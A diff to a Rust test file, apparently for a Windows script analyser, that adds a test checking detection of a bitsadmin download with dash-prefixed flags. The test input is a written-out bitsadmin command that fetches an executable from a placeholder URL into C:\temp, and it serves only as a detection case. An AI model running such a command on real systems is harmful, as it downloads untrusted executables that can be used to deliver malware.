@@ -6698,6 +6698,26 @@ mod bitsadmin_tests {
     }
 
     #[test]
+    fn bitsadmin_transfer_accepts_dash_prefixed_flags() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "bitsadmin -transfer myjob -download -priority foreground http://x/dash.exe C:\\temp\\dash.exe",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "http://x/dash.exe" && dst == "C:\\temp\\dash.exe"
+            )
+        });
+        assert!(
+            has,
+            "no BitsadminDownload for dash-prefixed flags: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn bitsadmin_addfile_emits_download() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
